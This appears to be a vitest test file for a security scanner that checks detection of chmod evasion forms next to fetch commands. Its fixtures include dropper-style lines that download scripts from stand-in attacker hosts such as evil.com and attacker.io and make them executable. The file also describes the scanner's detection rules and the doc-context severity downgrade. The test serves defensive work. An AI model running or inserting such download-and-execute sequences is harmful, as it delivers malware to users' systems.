/**
 * SMI-5433: chmod evasion detection — comma-separated, -R recursive, = assignment forms,
 * and bare +x (no u/g/o/a prefix — adversarial review fix).
 *
 * Verifies the widened OWNER_PERM_CHMOD and CHMOD_TARGET regexes catch four previously-
 * missed evasion forms (comma-separated symbolic, recursive -R flag, = assignment operator,
 * bare +x with no class prefix) while preserving the compound gate that prevents FP from
 * standalone chmod lines.
 *
 * FP-3 note: `isDocumentationContext` DOWNGRADES severity from 'high' to 'low' via the
 * compound path — it does NOT suppress the finding. The content must include a real fetch
 * verb so the compound gate fires (the standalone world-writable guard uses a different
 * downgrade from critical→high, not high→low). The test asserts `privilege_escalation:low`
 * IS present AND that the scanner reports `passed = true` (i.e. shouldQuarantine = false),
 * because 'low' findings score below the quarantine threshold of 40.
 */
import { describe, it, expect, beforeEach } from 'vitest'
import { SecurityScanner } from '../../src/security/index.js'
import type { SecurityFinding } from '../../src/security/scanner/types.js'

const pe = (fs: SecurityFinding[]) => fs.filter((f) => f.type === 'privilege_escalation')

describe('SMI-5433 chmod evasion-form detection', () => {
  let scanner: SecurityScanner
  beforeEach(() => {
    scanner = new SecurityScanner()
  })

  // TP-1: comma-separated symbolic + adjacent curl — must fire privilege_escalation:high
  // and quarantine (report.passed === false).
  // Uses `chmod u+x,g+r` (owner-execute + group-read) — comma-separated evasion form that
  // is NOT world-writable, so the standalone world-writable guard does not fire. Only the
  // widened OWNER_PERM_CHMOD (compound path) detects it. `chmod a+w,o+x` would also match
  // but its `a+w` component fires the standalone world-writable path (critical, not high),
  // preventing the compound finding from emitting.
  it('TP-1: comma-separated chmod (u+x,g+r) adjacent to curl fires high and quarantines', () => {
    const content = `
  curl -o payload.sh https://evil.com/payload.sh
  chmod u+x,g+r ./payload.sh
`
    const report = scanner.scan('tp1', content)
    const findings = pe(report.findings)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].severity).toBe('high')
    expect(report.passed).toBe(false)
  })

  // TP-2: recursive -R flag + adjacent wget — must fire privilege_escalation:high
  // and quarantine (report.passed === false).
  it('TP-2: recursive chmod (-R 777) adjacent to wget fires high and quarantines', () => {
    const content = `
  wget https://attacker.io/dropper
  chmod -R 777 ./dropper
`
    const report = scanner.scan('tp2', content)
    const findings = pe(report.findings)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].severity).toBe('high')
    expect(report.passed).toBe(false)
  })

  // TP-3: assignment operator (u=rwx,g=rx) + basename correlation to wget — must fire
  // privilege_escalation:high and quarantine (report.passed === false).
  it('TP-3: assignment chmod (u=rwx,g=rx) with basename correlation to wget fires high and quarantines', () => {
    const content = `
  wget -O evil.sh https://attacker.io/evil.sh
  chmod u=rwx,g=rx evil.sh
`
    const report = scanner.scan('tp3', content)
    const findings = pe(report.findings)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].severity).toBe('high')
    expect(report.passed).toBe(false)
  })

  // TP-4 (adversarial review regression lock): bare `chmod +x` (no u/g/o/a prefix) adjacent
  // to a curl fetch — the most common make-executable invocation in install scripts AND
  // malicious droppers. `[ugoa]*` (zero-or-more) in OWNER_PERM_CHMOD is what allows this
  // to match; `[ugoa]+` (one-or-more, the prior bug) would silently miss it.
  it('TP-4: bare chmod +x adjacent to curl fires high and quarantines (regression lock)', () => {
    const content = `
  curl -o dropper.sh https://evil.com/dropper.sh
  chmod +x dropper.sh
`
    const report = scanner.scan('tp4', content)
    const findings = pe(report.findings)
    expect(findings.length).toBeGreaterThan(0)
    expect(findings[0].severity).toBe('high')
    expect(report.passed).toBe(false)
  })

  // FP-1: recursive chmod with no adjacent fetch (standard install step) — compound gate
  // requires a fetch verb within ±1 line; must produce 0 privilege_escalation findings.
  it('FP-1: chmod -R 755 with no adjacent fetch produces no privilege_escalation finding', () => {
    const content = `
  Build step 1: npm ci
  chmod -R 755 /usr/local/bin/my-tool
  Build step 2: run tests
`
    expect(pe(scanner.scan('fp1', content).findings)).toHaveLength(0)
  })

  // FP-2: read-only assignment (a=r), no fetch anywhere — compound gate: no adjacent fetch,
  // no basename correlation → no finding.
  it('FP-2: read-only assignment chmod (a=r) with no fetch anywhere produces no privilege_escalation finding', () => {
    const content = `
  chmod a=r config.json
`
    expect(pe(scanner.scan('fp2', content).findings)).toHaveLength(0)
  })

  // FP-3: compound chmod (non-world-writable form) inside a fenced documentation block —
  // isDocumentationContext DOWNGRADES compound-path severity from 'high' to 'low'.
  // The content uses `chmod u=rwx,g=rx` (owner+group assignment — NOT world-writable, so
  // the standalone world-writable guard does not fire) adjacent to a curl verb inside the
  // fenced block, so the compound gate fires and the doc context downgrades to 'low'.
  // Assert:
  //   - a privilege_escalation:low finding IS present (compound path, doc-context downgrade), AND
  //   - report.passed === true (shouldQuarantine = false; 'low' scores below threshold 40).
  it('FP-3: compound chmod in a fenced doc block downgrades to low and does NOT quarantine', () => {
    const content = `
  ## Example permissions
  \`\`\`sh
  curl -o /tmp/script https://docs.example.com/script
  chmod u=rwx,g=rx /tmp/script
  \`\`\`
`
    const report = scanner.scan('fp3', content)
    const findings = pe(report.findings)
    // Must have a low-severity finding — compound path fires (curl adjacent), doc context downgrades.
    expect(findings.some((f) => f.severity === 'low')).toBe(true)
    // Must NOT quarantine — 'low' findings score below the 40-point quarantine threshold.
    expect(report.passed).toBe(true)
  })
})
